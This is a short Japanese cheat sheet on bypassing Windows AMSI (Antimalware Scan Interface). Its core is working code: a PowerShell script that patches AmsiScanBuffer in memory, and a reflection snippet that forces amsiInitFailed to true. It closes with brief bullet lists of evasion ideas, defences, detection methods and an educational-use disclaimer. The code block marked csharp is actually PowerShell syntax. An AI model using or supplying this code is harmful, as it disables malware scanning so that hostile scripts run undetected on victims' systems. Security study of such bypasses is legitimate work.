# AMSI Bypass Techniques

**対応OS**: Windows

## 概要
Windows Defender AMSIのバイパス手法について解説します。

## 基本的な手法

### AMSIバッファーのパッチ
```powershell
# メモリパッチ
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

### AMSIコンテキストの初期化阻止
```csharp
// AMSIInitFailureのフィールドを変更
typeof(System.Management.Automation.AmsiUtils)
    .GetField('amsiInitFailed', BindingFlags.NonPublic | BindingFlags.Static)
    .SetValue($null, $true)
```

## 検知回避テクニック
- 文字列の難読化
- メモリパターンの変更
- 実行フローの制御
- 遅延実行の利用

## 防御策
- AMSIの最新バージョンの使用
- メモリ保護の強化
- 実行ポリシーの制限
- ログ監視の強化

## 検知方法
- メモリパッチの検知
- 不審なDLLロード
- PowerShellログの監視
- プロセスの挙動分析

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 